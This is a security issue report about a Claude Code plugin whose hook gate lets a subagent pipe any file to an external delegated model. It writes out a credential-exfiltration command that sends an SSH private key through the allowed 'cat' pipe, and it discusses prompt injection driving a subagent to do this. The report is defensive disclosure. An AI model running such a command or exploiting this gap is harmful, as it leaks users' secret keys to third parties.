## Summary
antigravity-kit's delegation gate allows piping arbitrary file content (e.g. an SSH private key) to the external model via `cat <file> | agy-delegate -`

## Environment
- **Product/Service**: Claude Code plugin marketplace (`andres-cc-marketplace`), `plugins/antigravity-kit/hooks/validate-delegate-bash.sh`
- **Region/Version**: `antigravity-kit` v0.1.0

## Reproduction Steps
1. Install `antigravity-kit`; the `antigravity-delegate` subagent's `PreToolUse` gate (`validate-delegate-bash.sh`) is active (assuming plugin-scoped agent hooks are honored — see the plugin's own disclosed, separate open question about that).
2. Have the subagent run `cat ~/.ssh/id_ed25519 | agy-delegate --yolo -`.
3. The gate approves this: its allowed-producers list (`cat`, `echo`, `printf`) permits any file to be piped through, since it only checks the producer's *name*, never its arguments.

## Expected Behavior
A subagent that has been prompt-injected (or otherwise induced) into piping a sensitive file should not be able to transmit that file's contents to the external delegated model (Gemini/Antigravity) via an allowed command shape.

## Actual Behavior
The gate's own header comment explicitly documents this as a deliberate design tradeoff: it cannot distinguish a legitimate long-prompt-via-stdin pipe from a credential-exfiltration pipe by producer name alone, so the boundary is intentionally pushed to agent-level discipline (the agent's own documentation instructs against piping file content) rather than hook-level enforcement. This is disclosed in 3 places: the hook's own header comment, `SECURITY.md`, and `agents/antigravity-delegate.md`'s data-boundary paragraph.

An independent `cross-model-review` pass (Codex) re-derived this exact gap during the `antigravity-kit` plugin transfer PR and rated it Critical with a concrete demonstrated payload (`cat ~/.ssh/id_ed25519 | agy-delegate --yolo -`, confirmed to exit 0 through the gate).

## Impact
**Medium-High** (disputed) — this is a known, disclosed architectural tradeoff, not a silent gap, and closing it technically would break a legitimate documented use case (piping a long prompt via `-`). However, the concrete payload (an SSH private key, or any other credential file the subagent can `cat`) demonstrates real exposure if the disclosed agent-level mitigation (prompt-level discipline, not hard enforcement) is ever defeated by prompt injection. Two independent AI reviewers now agree the underlying data-flow is real; they disagree on severity (Critical vs. Major) based on whether "already disclosed" should lower the practical risk.

## Additional Context
This is the same underlying gap as this session's earlier Phase 5 `security-reviewer` finding M1, which was addressed via documentation disclosure only (not by closing the gate) in commit `3cad6370` on the `antigravity-kit` transfer PR (branch `feat/add-antigravity-kit`). This issue tracks the open design question: is the disclosed agent-level mitigation sufficient, or should the gate additionally close the technical channel (e.g., by removing `cat`/`echo`/`printf` from the allowed pipe producers and requiring `--dir` for all bulk/file content, at the cost of breaking the documented long-prompt-via-stdin use case)? This is a decision for whoever owns this plugin's security posture going forward, not an implementation request.
